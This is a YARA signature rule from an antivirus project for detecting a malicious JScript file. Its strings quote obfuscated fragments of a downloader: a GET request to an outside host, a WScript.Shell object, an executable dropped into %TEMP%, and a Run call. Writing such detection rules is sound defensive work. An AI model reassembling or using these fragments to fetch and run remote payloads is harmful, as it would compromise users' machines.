rule sig_20160401_4baa3898d31d054c796a2ce71f075660 {
  meta:
    description = "datamaliciousorder - file 20160401_4baa3898d31d054c796a2ce71f075660.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "712ad2753ad89db5ace5f751d963acce070a5c286a28bced3d5b7ceb5722b855"

  strings:
    $s1  = "AjxPq[YnKq](\"G\" + \"ET\", \"http://beatorooms.com/n2isa\", false);" fullword ascii
    $s2  = "var JhiOw = function TvGfy() {return WScript[VtOda](\"WScript\"+\".Shell\");}(), BumPw = 11;" fullword ascii
    $s3  = "function MaAr(MsjMi, IqAy){LhSl = LhSl * 1; return MsjMi - IqAy;};" fullword ascii
    $s4  = "if (AjxPq[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function YgnOq(){return McHh + \"\";};" fullword ascii
    $s6  = "function KbaHfv() {return JhiOw[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"rL5nXKm1k7f.ex\" + \"e\";};" fullword ascii
    $s7  = "function FsbHpu() {return ((YkbIaa == true) && (YkbIaa == KwCzk)) ? 1 : LhSl;};" fullword ascii
    $s8  = "function GntPgn(){return 23;};" fullword ascii
    $s9  = "return MaAr(HmCjg, PouRq);" fullword ascii
    $s10 = "var KwCzk = false;" fullword ascii
    $s11 = "function RhlDib()" fullword ascii
    $s12 = "}while (EcKcg);" fullword ascii
    $s13 = "KwCzk = true; " fullword ascii
    $s14 = "YkbIaa = true; " fullword ascii
    $s15 = "var YkbIaa = false;" fullword ascii
    $s16 = "var WtOa = new this[\"Date\"]();" fullword ascii
    $s17 = "function AdQt(){return VtOda;};" fullword ascii
    $s18 = "function QxkAcc(DufSk) {var EjdLd = (1, 2, 3, 4, 5, DufSk); return EjdLd;};" fullword ascii
    $s19 = "var EfQk = false;" fullword ascii
    $s20 = "function TxEqd(GndPfl){JhiOw[\"R\"+\"un\"](GndPfl, LhSl, LhSl);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}